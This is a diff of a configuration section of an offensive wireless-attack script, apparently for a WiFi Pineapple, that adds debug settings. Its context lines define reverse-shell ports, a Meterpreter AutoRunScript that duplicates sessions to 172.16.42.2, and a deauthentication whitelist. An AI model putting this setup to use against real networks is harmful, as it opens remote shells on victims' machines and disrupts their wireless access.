@@ -31,7 +31,7 @@ osx_port="6446"
 win_port="587"
 # Port for Windows PowerShell shells (requires a different AutoRunScript)
 ps_win_port="8080"
-# Port for Linux reverse shells 
+# Port for Linux reverse shells
 nix_port="8443"
 # Meterpreter AutoRunScript - Assosiated with ${windows_payload}
 echo -e "duplicate -r 172.16.42.2 -p 8080 -D
@@ -46,9 +46,15 @@ channels="1,2,3,4,5,6,7,8,9,10,11"
 echo "${pineapple_mac}
 00:00:00:00:00:00
 FF:FF:FF:FF:FF:FF" > /tmp/deauth.conf
-
 # Leg3nd's DeAuth Script - comma seperated format (AP's only).
 deauth_whitelist="${pineapple_mac},40:0E:85:02:31:6B,00:00:00:00:00,FF:FF:FF:FF:FF,AE:22:0B:33:74:F9"
+
+# [ Debug Output Configurations]
+# Enable or disable debug.
+# WARNING: This will have network and system configuration information.
+debug="0"
+# Output file for debug infromation
+debug_output="debug_$(date +%Y-%d-%m-%s).txt"
 #------------------------------------------------------------------------------------------
 
 # Start it all up [DONT EDIT BELOW HERE] #
